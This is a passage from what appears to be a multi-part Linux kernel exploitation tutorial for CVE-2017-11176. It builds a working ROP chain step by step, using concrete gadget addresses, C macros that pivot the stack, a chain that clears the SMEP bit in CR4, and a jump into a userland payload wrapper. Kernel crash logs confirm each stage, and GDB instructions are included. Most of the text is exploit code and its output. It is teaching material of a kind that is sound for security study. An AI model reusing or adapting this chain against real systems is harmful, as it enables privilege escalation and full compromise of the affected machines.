<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">retry</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="c1">// paranoid check</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">g_uland_wq_elt</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">g_fake_stack</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x100000000</span><span class="p">))</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">munmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">g_fake_stack</span><span class="p">,</span><span class="w"> </span><span class="mi">4096</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">munmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">g_uland_wq_elt</span><span class="p">,</span><span class="w"> </span><span class="mi">4096</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">retry</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] userland structures allocated:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] g_uland_wq_elt = %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">g_uland_wq_elt</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] g_fake_stack   = %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">g_fake_stack</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>

<span class="c1">// ----------------------------------------------------------------------------</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">init_realloc_data</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">  </span><span class="n">nlk_wait</span><span class="o">-&gt;</span><span class="n">task_list</span><span class="p">.</span><span class="n">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">list_head</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">g_uland_wq_elt</span><span class="o">-&gt;</span><span class="n">task_list</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">nlk_wait</span><span class="o">-&gt;</span><span class="n">task_list</span><span class="p">.</span><span class="n">prev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">list_head</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">g_uland_wq_elt</span><span class="o">-&gt;</span><span class="n">task_list</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">  </span><span class="n">g_uland_wq_elt</span><span class="o">-&gt;</span><span class="n">func</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">wait_queue_func_t</span><span class="p">)</span><span class="w"> </span><span class="n">XCHG_EAX_ESP_ADDR</span><span class="p">;</span><span class="w"> </span><span class="c1">// &lt;----- STACK PIVOT!</span>

<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="p">}</span><span class="w"></span>

<span class="c1">// ----------------------------------------------------------------------------</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] successfully migrated to CPU#0</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">allocate_uland_structs</span><span class="p">())</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] failed to allocate userland structures!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="n">build_rop_chain</span><span class="p">((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">g_fake_stack</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] ROP-chain ready</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>As you might have noticed in <strong>build_rop_chain()</strong>, we setup an invalid temporary ROP-chain just for debugging purpose. The first gadget address being "0x00000000", it will provoke a <strong>double fault</strong>.</p><p>Let's launch the exploit:</p><div class="highlight"><pre><span></span><code>...
[+] userland structures allocated:
[+] g_uland_wq_elt = 0x120001000
[+] g_fake_stack   = 0x20001000
[+] g_uland_wq_elt.func = 0xffffffff8107b6b8
...
</code></pre></div><div class="highlight"><pre><span></span><code>[   79.094437] double fault: 0000 [#1] SMP 
[   79.094738] CPU 0 
...
[   79.097909] RIP: 0010:[&lt;0000000000000000&gt;]  [&lt;(null)&gt;] (null)
[   79.097980] RSP: 0018:0000000020001008  EFLAGS: 00010012
[   79.098024] RAX: 000000001c123e60 RBX: 0000000000602c08 RCX: 0000000000000000
[   79.098074] RDX: 0000000000000000 RSI: 0000000000000001 RDI: 0000000120001000
[   79.098124] RBP: ffff88001c123ea8 R08: 0000000000000000 R09: 00007fa46644f700
[   79.098174] R10: 00007fffd73a4350 R11: 0000000000000206 R12: 0000000000000001
[   79.098225] R13: ffff88001c999eb8 R14: 0000000000000000 R15: 0000000000000000
...
[   79.098907] Stack:
[   79.098954]  bbbbbbbbbbbbbbbb cccccccccccccccc dddddddddddddddd aaaaaaaaaaaaaaaa
[   79.099209] &lt;d&gt; aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa
[   79.100516] &lt;d&gt; aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa
[   79.102583] Call Trace:
[   79.103844] Code:  Bad RIP value.
[   79.104686] RIP  [&lt;(null)&gt;] (null)
[   79.105332]  RSP &lt;0000000020001008&gt;
...
</code></pre></div><p>Perfect, just as expected! <strong>RSP</strong> is pointing to the second gadget of our ROP-chain in our <em>fake stack</em>. It double-faulted while trying to execute the first one which points at address zero (RIP=0).</p><p>Remember, <strong>ret</strong> first "pops" the value into <em>rip</em> and THEN executes it! That is why, RSP is pointing to the second gadget (not the first one).</p><p>We are now ready to write the real ROP-chain!</p><p><strong>NOTE</strong>: <strong>Forcing a double-fault is a good way to debug a ROP-chain as it will crash the kernel and dump both the registers and the stack</strong>. This is the "poor man" breakpoint :-).</p><hr><h1 id="debugging-the-kernel-with-gdb">Debugging the kernel with GDB</h1><p>Debugging a kernel (without SystemTap) might be an intimidating thing to the new comers. In the previous articles we already saw different ways to debug the kernel:</p><ul><li>SystemTap</li><li>netconsole</li></ul><p>However, sometimes you want to debug more "low-level" stuff and go step-by-step.</p><p>Just like any other binary (Linux being an ELF) <strong>you can use GDB to debug it</strong>.</p><p>Most virtualization solutions setup a <strong>gdb server</strong> that you can connect to debug a "guest" system. For instance, while running a 64-bit kernel, <em>vmware</em> setup a <em>gdbserver</em> on port "8864". If not, please read the manual.</p><p>Because of the chaotic/concurrent nature of a kernel, you might want to <strong>limit the number of CPU to one</strong> while debugging.</p><p>Let's suppose we want to debug the arbitrary call primitive. One would be tempted to setup a breakpoint just before the call (i.e. "call [rax+0x10]")... don't! The reason is, a lot of kernel paths (including interrupts handler) actually call this code. That is, <strong>you will be breaking all time without being in your own path</strong>.</p><p>The trick is to set a breakpoint earlier (callstack-wise) on a "not so used" path that is very specific to your bug/exploit. In our case, we will break in <em>netlink_setsockopt()</em> just before the call to <em>__wake_up()</em> (located at address 0xffffffff814b81c7):</p><div class="highlight"><pre><span></span><code>$ gdb ./vmlinux-2.6.32 -ex <span class="s2">"set architecture i386:x86-64"</span> -ex <span class="s2">"target remote:8864"</span> -ex <span class="s2">"b * 0xffffffff814b81c7"</span> -ex <span class="s2">"continue"</span>
</code></pre></div><p>Remember that our exploit reaches this code 3 times: two to unblock the thread and one to reach the arbitrary call. That is, use <strong>continue</strong> until the 3rd break then do a step-by-step debugging (with "ni" and "si"). In addition, <em>__wake_up()</em> issues another <em>call</em> before <em>__wake_up_common()</em>, you might want to use <strong>finish</strong>.</p><p>From here, this is just a "normal" debugging session.</p><p><strong>WARNING</strong>: Remember to <strong>detach</strong> before leaving <em>gdb</em>. Otherwise, it can lead to "strange" issues that confuse your virtualization tool.</p><hr><h1 id="the-rop-chain">The ROP-Chain</h1><p>In the previous section, we analyzed the machine state (i.e. registers) prior to using the arbitrary call primitive. We found a gadget that pivot the stack with the <em>xchg</em> instruction that uses 32-bit registers. Because of it, the "new stack" and our userland wait queue element aliased. In order to deal with it, we use a simple trick to avoid this aliasing and still pivoting to a userland stack. This helps to relax the constraints on future gadgets, avoid stack lifting, etc.</p><p>In this section, we will build a ROP-chain that:</p><ul><li>Stores ESP and RBP in userland memory for future restoration</li><li>Disables SMEP by flipping the corresponding CR4 bit (cf. Defeating SMEP Strategies)</li><li>Jumps to the payload's wrapper</li></ul><p>Note that the things done here are very similar to what is done in "userland" ROP exploitation. In addition, this is <strong>very target dependent</strong>. You might have better or worse gadgets. This is just the ROP-chain we built with gadgets available in our target.</p><p><strong>WARNING</strong>: It is very rare, but it can happen that the gadget you are trying to use will not work during runtime for some reason (e.g. trampoline, kernel hooks, unmapped). In order to prevent this, break before executing the ROP-chain and check with gdb that your gadgets are as expected in memory. Otherwise, simply choose another one.</p><p><strong>WARNING-2</strong>: If your gadgets modify "non-scratch" registers (as we do with rbp/rsp) you will need to repair them by the end of your ROP-chain.</p><h2 id="unfortunate-cr4-gadgets">Unfortunate "CR4" gadgets</h2><p>Disabling SMEP will not be the first "sub-chain" of our ROP chain (we will save <em>ESP</em> beforehand). However, because of the available gadgets that modify <em>cr4</em>, we will need additional gadgets to load/store <em>RBP</em>:</p><div class="highlight"><pre><span></span><code>$ egrep "cr4" ranged_gadget.lst
0xffffffff81003288 : add byte ptr [rax - 0x80], al ; out 0x6f, eax ; mov cr4, rdi ; leave ; ret
0xffffffff81003007 : add byte ptr [rax], al ; mov rax, cr4 ; leave ; ret
0xffffffff8100328a : and bh, 0x6f ; mov cr4, rdi ; leave ; ret
0xffffffff81003289 : and dil, 0x6f ; mov cr4, rdi ; leave ; ret
0xffffffff8100328d : mov cr4, rdi ; leave ; ret                       // &lt;----- will use this
0xffffffff81003009 : mov rax, cr4 ; leave ; ret                       // &lt;----- will use this
0xffffffff8100328b : out 0x6f, eax ; mov cr4, rdi ; leave ; ret
0xffffffff8100328c : outsd dx, dword ptr [rsi] ; mov cr4, rdi ; leave ; ret
</code></pre></div><p>As we can see, <strong>all of those gadgets have a <em>leave</em> instruction preceding the <em>ret</em></strong>. It means that using them <strong>will overwrite both <em>RSP</em> and <em>RBP</em></strong> which can break our ROP-chain. Because of this, we will need to save and restore them.</p><h2 id="save-esprbp">Save ESP/RBP</h2><p>In order to save the value of ESP and RSP we will use four gadgets:</p><div class="highlight"><pre><span></span><code>0xffffffff8103b81d : pop rdi ; ret
0xffffffff810621ff : shr rax, 0x10 ; ret
0xffffffff811513b3 : mov dword ptr [rdi - 4], eax ; dec ecx ; ret
0xffffffff813606d4 : mov rax, rbp ; dec ecx ; ret
</code></pre></div><p>Since our gadget which writes at arbitrary memory location read value from "eax" (32-bits), we use the <em>shr</em> gadget to store the value of RBP in two times (low and high bits). The ROP-chains are declared here:</p><div class="highlight"><pre><span></span><code><span class="c1">// gadgets in [_text; _etext]</span>
<span class="cp">#define XCHG_EAX_ESP_ADDR         ((uint64_t) 0xffffffff8107b6b8)</span>
<span class="cp">#define MOV_PTR_RDI_MIN4_EAX_ADDR ((uint64_t) 0xffffffff811513b3)</span>
<span class="cp">#define POP_RDI_ADDR              ((uint64_t) 0xffffffff8103b81d)</span>
<span class="cp">#define MOV_RAX_RBP_ADDR          ((uint64_t) 0xffffffff813606d4)</span>
<span class="cp">#define SHR_RAX_16_ADDR           ((uint64_t) 0xffffffff810621ff)</span>

<span class="c1">// ROP-chains</span>
<span class="cp">#define STORE_EAX(addr) \</span>
<span class="cp">  *stack++ = POP_RDI_ADDR; \</span>
<span class="cp">  *stack++ = (uint64_t)addr + 4; \</span>
<span class="cp">  *stack++ = MOV_PTR_RDI_MIN4_EAX_ADDR;</span>

<span class="cp">#define SAVE_ESP(addr) \</span>
<span class="cp">  STORE_EAX(addr);</span>

<span class="cp">#define SAVE_RBP(addr_lo, addr_hi) \</span>
<span class="cp">  *stack++ = MOV_RAX_RBP_ADDR;  \</span>
<span class="cp">  STORE_EAX(addr_lo); \</span>
<span class="cp">  *stack++ = SHR_RAX_16_ADDR; \</span>
<span class="cp">  *stack++ = SHR_RAX_16_ADDR; \</span>
<span class="cp">  STORE_EAX(addr_hi);</span>
</code></pre></div><p>Let's edit <em>build_rop_chain()</em>:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="k">volatile</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">saved_esp</span><span class="p">;</span><span class="w"></span>
<span class="k">static</span><span class="w"> </span><span class="k">volatile</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">saved_rbp_lo</span><span class="p">;</span><span class="w"></span>
<span class="k">static</span><span class="w"> </span><span class="k">volatile</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">saved_rbp_hi</span><span class="p">;</span><span class="w"></span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">build_rop_chain</span><span class="p">(</span><span class="kt">uint64_t</span><span class="w"> </span><span class="o">*</span><span class="n">stack</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="n">memset</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">stack</span><span class="p">,</span><span class="w"> </span><span class="mh">0xaa</span><span class="p">,</span><span class="w"> </span><span class="mi">4096</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">SAVE_ESP</span><span class="p">(</span><span class="o">&amp;</span><span class="n">saved_esp</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">SAVE_RBP</span><span class="p">(</span><span class="o">&amp;</span><span class="n">saved_rbp_lo</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">saved_rbp_hi</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="o">*</span><span class="n">stack</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="c1">// force double-fault</span>

<span class="w">  </span><span class="c1">// FIXME: implement the ROP-chain</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Before proceeding, you may want to <strong>be sure that everything goes well up to this point</strong>. Use GDB as explained in the previous section!</p><h2 id="readwrite-cr4-and-dealing-with-leave">Read/Write CR4 and dealing with "leave"</h2><p>As mentioned before, all our gadgets that manipulate <em>CR4</em> have a <em>leave</em> instruction before the <em>ret</em>. Which does (in this order):</p><ol><li>RSP = RBP</li><li>RBP = Pop()</li></ol><p>In this ROP-chain, we will use three gadgets:</p><div class="highlight"><pre><span></span><code>0xffffffff81003009 : mov rax, cr4 ; leave ; ret
0xffffffff8100328d : mov cr4, rdi ; leave ; ret
0xffffffff811b97bf : pop rbp ; ret
</code></pre></div><p>Since <em>RSP</em> is overwritten while executing the <em>leave</em> instruction, we have to make sure that it does not break the chain (i.e. <em>RSP</em> is still right).</p><p>As <em>RSP</em> is overwritten by <em>RBP</em>, we will re-write <em>RBP</em> prior executing those gadgets:</p><div class="highlight"><pre><span></span><code><span class="cp">#define POP_RBP_ADDR              ((uint64_t) 0xffffffff811b97bf)</span>
<span class="cp">#define MOV_RAX_CR4_LEAVE_ADDR    ((uint64_t) 0xffffffff81003009)</span>
<span class="cp">#define MOV_CR4_RDI_LEAVE_ADDR    ((uint64_t) 0xffffffff8100328d)</span>

<span class="cp">#define CR4_TO_RAX() \</span>
<span class="cp">  *stack++ = POP_RBP_ADDR; \</span>
<span class="cp">  *stack   = (unsigned long) stack + 2*8; stack++; </span><span class="cm">/* skip 0xdeadbeef */</span><span class="cp"> \</span>
<span class="cp">  *stack++ = MOV_RAX_CR4_LEAVE_ADDR; \</span>
<span class="cp">  *stack++ = 0xdeadbeef;  </span><span class="c1">// dummy RBP value!</span>

<span class="cp">#define RDI_TO_CR4() \</span>
<span class="cp">  *stack++ = POP_RBP_ADDR; \</span>
<span class="cp">  *stack   = (unsigned long) stack + 2*8; stack++; </span><span class="cm">/* skip 0xdeadbeef */</span><span class="cp"> \</span>
<span class="cp">  *stack++ = MOV_CR4_RDI_LEAVE_ADDR; \</span>
<span class="cp">  *stack++ = 0xdeadbeef;  </span><span class="c1">// dummy RBP value!</span>
</code></pre></div><p>While executing <em>leave</em>, <em>RSP</em> is pointing to the "0xdeadbeef" line which will be "poped" into <em>RBP</em>. That is, the next <em>ret</em> instruction will be back into our chain!</p><h2 id="clearing-smep-bit">Clearing SMEP bit</h2><p>As mentioned in the <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html#meeting-supervisor-mode-execution-prevention">Meeting Supervisor Mode Execution Prevention</a> section, SMEP is enabled when the bit 20 of CR4 is set. That is, we can clear it with the following operation:</p><div class="highlight"><pre><span></span><code><span class="n">CR4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CR4</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="o">~</span><span class="p">(</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">20</span><span class="p">)</span><span class="w"></span>
</code></pre></div><p>equivalent to:</p><div class="highlight"><pre><span></span><code><span class="n">CR4</span><span class="w"> </span><span class="o">&amp;=</span><span class="w"> </span><span class="mh">0xffffffffffefffff</span><span class="w"></span>
</code></pre></div><p>In this chain we will use the following gadgets as well as the previous ROP-chains:</p><div class="highlight"><pre><span></span><code>0xffffffff8130c249 : and rax, rdx ; ret
0xffffffff813d538d : pop rdx ; ret
0xffffffff814f118b : mov edi, eax ; dec ecx ; ret
0xffffffff8139ca54 : mov edx, edi ; dec ecx ; ret
</code></pre></div><p><strong>NOTE</strong>: The highest 32-bits of CR4 are "reserved", hence zero. That's why we can use 32-bits register gadgets.</p><p>That is, we disable SMEP with this chain:</p><div class="highlight"><pre><span></span><code><span class="cp">#define AND_RAX_RDX_ADDR          ((uint64_t) 0xffffffff8130c249)</span>
<span class="cp">#define MOV_EDI_EAX_ADDR          ((uint64_t) 0xffffffff814f118b)</span>
<span class="cp">#define MOV_EDX_EDI_ADDR          ((uint64_t) 0xffffffff8139ca54)</span>

<span class="cp">#define SMEP_MASK (~((uint64_t)(1 &lt;&lt; 20))) </span><span class="c1">// 0xffffffffffefffff</span>

<span class="cp">#define DISABLE_SMEP() \</span>
<span class="cp">  CR4_TO_RAX(); \</span>
<span class="cp">  *stack++ = POP_RDI_ADDR; \</span>
<span class="cp">  *stack++ = SMEP_MASK; \</span>
<span class="cp">  *stack++ = MOV_EDX_EDI_ADDR; \</span>
<span class="cp">  *stack++ = AND_RAX_RDX_ADDR; \</span>
<span class="cp">  *stack++ = MOV_EDI_EAX_ADDR; \</span>
<span class="cp">  RDI_TO_CR4();</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">build_rop_chain</span><span class="p">(</span><span class="kt">uint64_t</span><span class="w"> </span><span class="o">*</span><span class="n">stack</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="n">memset</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">stack</span><span class="p">,</span><span class="w"> </span><span class="mh">0xaa</span><span class="p">,</span><span class="w"> </span><span class="mi">4096</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">SAVE_ESP</span><span class="p">(</span><span class="o">&amp;</span><span class="n">saved_esp</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">SAVE_RBP</span><span class="p">(</span><span class="o">&amp;</span><span class="n">saved_rbp_lo</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">saved_rbp_hi</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">DISABLE_SMEP</span><span class="p">();</span><span class="w"></span>

<span class="w">  </span><span class="o">*</span><span class="n">stack</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="c1">// force double-fault</span>

<span class="w">  </span><span class="c1">// FIXME: implement the ROP-chain</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>It is time to test it and check the value of CR4!</p><div class="highlight"><pre><span></span><code>[  223.425209] double fault: 0000 [#1] SMP 
[  223.425745] CPU 0 
[  223.430785] RIP: 0010:[&lt;ffffffff8155ad78&gt;]  [&lt;ffffffff8155ad78&gt;] do_page_fault+0x8/0xa0
[  223.430930] RSP: 0018:0000000020000ff8  EFLAGS: 00010002
[  223.431000] RAX: 00000000000407f0 RBX: 0000000000000001 RCX: 000000008100bb8e
[  223.431101] RDX: 00000000ffefffff RSI: 0000000000000010 RDI: 0000000020001028
[  223.431181] RBP: 0000000020001018 R08: 0000000000000000 R09: 00007f4754a57700
[  223.431279] R10: 00007ffdc1b6e590 R11: 0000000000000206 R12: 0000000000000001
[  223.431379] R13: ffff88001c9c0ab8 R14: 0000000000000000 R15: 0000000000000000
[  223.431460] FS:  00007f4755221700(0000) GS:ffff880003200000(0000) knlGS:0000000000000000
[  223.431565] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  223.431638] CR2: 0000000020000fe8 CR3: 000000001a5d8000 CR4: 00000000000407f0
                                                                          ^--- !!!!!
</code></pre></div><p><strong>Ooh Yeah! SMEP is now disabled!</strong> We can now jump to userland code :-)!</p><h2 id="jumping-to-payloads-wrapper">Jumping to Payload's Wrapper</h2><p>One might wonder why we do "jump to a wrapper" instead of calling userland function directly. There are three reasons.</p><p>First, GCC automatically setup a "prologue" and an "epilogue" at the beginning/end of the C function to save/restore "non-scratch" registers. We are not aware of the <em>__attribute__()</em> macro allowing to change this behavior. It also embedded a "leave" instruction before returning. Because of this, the stack will be modified.</p><p>This is an issue because the stack is currently the userland one. However, if we repair it in the payload, it will be the kernel stack again. That is, it will push data on the userland stack and pop it on the kernel stack. It will <em>mis-align</em> the stack and will mostly lead to kernel crash.</p><p>Secondly, we want to <strong>restore the stack pointer to the kernel thread stack</strong> prior calling the payload. In other words, the payload will run just like any other kernel code (stack-wise). The only difference being that the code is located in userland.</p><p>Since we have access to userland code now, we won't do it in the ROP chain but with <strong>inline assembly</strong> instead. That is, when the final <em>ret</em> instruction is executed (in the wrapper), the kernel can continue "normal" execution after the <strong>curr-&gt;func()</strong> arbitrary call primitive (i.e. in <em>__wake_up_common()</em>).</p><p>Thirdly, we want some "abstraction" so the final payload is somehow "agnostic" of the arbitrary call requirements. With our arbitrary call primitive, it is required that the called function <strong>return a non-null value to reach the <em>break</em> statement</strong>. We will do this in the wrapper.</p><p>In order to do it, we use the following gadgets:</p><div class="highlight"><pre><span></span><code>0xffffffff81004abc : pop rcx ; ret
0xffffffff8103357c : jmp rcx
</code></pre></div><p>The jump ROP-chain becomes:</p><div class="highlight"><pre><span></span><code><span class="cp">#define POP_RCX_ADDR              ((uint64_t) 0xffffffff81004abc)</span>
<span class="cp">#define JMP_RCX_ADDR              ((uint64_t) 0xffffffff8103357c)</span>

<span class="cp">#define JUMP_TO(addr) \</span>
<span class="cp">  *stack++ = POP_RCX_ADDR; \</span>
<span class="cp">  *stack++ = (uint64_t) addr; \</span>
<span class="cp">  *stack++ = JMP_RCX_ADDR;</span>
</code></pre></div><p>Invoked with:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">build_rop_chain</span><span class="p">(</span><span class="kt">uint64_t</span><span class="w"> </span><span class="o">*</span><span class="n">stack</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="n">memset</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">stack</span><span class="p">,</span><span class="w"> </span><span class="mh">0xaa</span><span class="p">,</span><span class="w"> </span><span class="mi">4096</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">SAVE_ESP</span><span class="p">(</span><span class="o">&amp;</span><span class="n">saved_esp</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">SAVE_RBP</span><span class="p">(</span><span class="o">&amp;</span><span class="n">saved_rbp_lo</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">saved_rbp_hi</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">DISABLE_SMEP</span><span class="p">();</span><span class="w"></span>
<span class="w">  </span><span class="n">JUMP_TO</span><span class="p">(</span><span class="o">&amp;</span><span class="n">userland_entry</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>And the "stub" for the wrapper is:</p><div class="highlight"><pre><span></span><code><span class="k">extern</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">userland_entry</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span><span class="w"> </span><span class="c1">// make GCC happy</span>

<span class="k">static</span><span class="w"> </span><span class="n">__attribute__</span><span class="p">((</span><span class="n">unused</span><span class="p">))</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="n">wrapper</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// avoid the prologue</span>
<span class="w">  </span><span class="n">__asm__</span><span class="w"> </span><span class="nf">volatile</span><span class="p">(</span><span class="w"> </span><span class="s">"userland_entry:"</span><span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="p">);</span><span class="w">   </span><span class="c1">// &lt;----- jump here</span>

<span class="w">  </span><span class="c1">// FIXME: repair the stack</span>
<span class="w">  </span><span class="c1">// FIXME: call to "real" payload</span>

<span class="w">  </span><span class="c1">// avoid the epilogue and the "leave" instruction</span>
<span class="w">  </span><span class="n">__asm__</span><span class="w"> </span><span class="nf">volatile</span><span class="p">(</span><span class="w"> </span><span class="s">"ret"</span><span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Note that you need to declare <em>userland_entry</em> as <em>external</em>, which actually points to a label at the very top of the wrapper, otherwise GCC will complain. In addition, we mark the <em>wrapper()</em> function with <em>__attribute__((unused))</em> to avoid some compilation warning.</p><h2 id="restoring-the-stack-pointers-and-wrapper-finalization">Restoring the Stack Pointers and Wrapper Finalization</h2><p>Restoring the stack pointers is pretty straightforward as we saved them during the ROP-chain. Note that we only saved the "32 lowest bits" of RSP. Fortunately, we also stored "RBP". Except if the <strong>stack frame</strong> of <em>__wake_up_common()</em> is 4GB large, the "32 highest bits" of RSP will be the same from RBP. That is we can restore both of them with:</p><div class="highlight"><pre><span></span><code><span class="n">restored_rbp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="n">saved_rbp_hi</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">32</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">saved_rbp_lo</span><span class="p">);</span><span class="w"></span>
<span class="n">restored_rsp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="n">saved_rbp_hi</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">32</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">saved_esp</span><span class="p">);</span><span class="w"></span>
</code></pre></div><p>As mentioned in the previous section, the arbitrary call primitive also required that we return a non-zero value. The wrapper becomes:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="k">volatile</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">restored_rbp</span><span class="p">;</span><span class="w"></span>
<span class="k">static</span><span class="w"> </span><span class="k">volatile</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">restored_rsp</span><span class="p">;</span><span class="w"></span>

